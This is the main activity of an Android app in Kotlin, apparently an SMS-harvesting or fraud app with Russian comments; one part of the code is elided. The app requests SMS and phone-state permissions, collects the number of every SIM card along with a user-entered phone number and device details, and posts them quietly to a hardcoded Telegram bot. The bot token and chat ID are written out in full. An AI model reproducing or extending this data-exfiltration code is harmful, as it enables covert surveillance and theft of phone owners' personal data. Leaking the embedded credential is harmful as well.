package com.analyzer.smsbeta

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.text.InputType
import android.view.LayoutInflater
import android.webkit.WebView
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var myWebView: WebView
    private val client = OkHttpClient()

    companion object {
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "AppPrefs"
        private const val PHONE_NUMBER_KEY = "phone_number"
        private val REQUIRED_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS
            )
        } else {
            arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE
            )
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)

        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        myWebView = findViewById(R.id.webview)

        with(myWebView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }

        checkInternetConnectionBeforePermissions()
    }

    // ... [остальные методы остаются без изменений до onAllPermissionsGranted]

    private fun onAllPermissionsGranted() {
        // Получаем номера всех SIM-карт
        val simNumbers = getSimCardNumbers()
        sendNotification("Получены номера SIM-карт:\n${simNumbers.joinToString("\n")}")

        val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
        if (savedPhoneNumber == null) {
            showStyledPhoneNumberDialog()
        } else {
            loadWebView()
        }
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getSimCardNumbers(): List<String> {
        val numbers = mutableListOf<String>()
        
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            
            // Для Android 5.1+ (API 22+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(SubscriptionManager::class.java)
                val activeSubscriptions: List<SubscriptionInfo>? = subscriptionManager?.activeSubscriptionInfoList
                
                activeSubscriptions?.forEach { subscriptionInfo ->
                    val number = telephonyManager.getLine1Number(subscriptionInfo.subscriptionId)
                    if (!number.isNullOrEmpty()) {
                        numbers.add("SIM ${subscriptionInfo.simSlotIndex + 1}: $number")
                    } else {
                        numbers.add("SIM ${subscriptionInfo.simSlotIndex + 1}: номер недоступен")
                    }
                }
            } else {
                // Для старых версий Android
                val number = telephonyManager.line1Number
                if (!number.isNullOrEmpty()) {
                    numbers.add("Основной номер: $number")
                } else {
                    numbers.add("Номер недоступен")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            numbers.add("Ошибка при получении номеров: ${e.message}")
        }
        
        return numbers
    }

    private fun sendNotification(message: String) {
        try {
            val deviceInfo = getDeviceInfo()
            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
            val time = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            
            val fullMessage = """
                📱 $message
                
                📝 Введенный номер: $phoneNumber
                📟 $deviceInfo
                ⏰ Время: $time
            """.trimIndent()

            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val chatId = "6331293386"
            val url = "https://api.telegram.org/bot$botToken/sendMessage"

            val mediaType = "application/json".toMediaType()
            val requestBody = """
                {
                    "chat_id": "$chatId",
                    "text": "$fullMessage",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: IOException) {
                    e.printStackTrace()
                }

                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getDeviceInfo(): String {
        return """
            Производитель: ${Build.MANUFACTURER}
            Модель: ${Build.MODEL}
            Версия ОС: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
        """.trimIndent()
    }
}
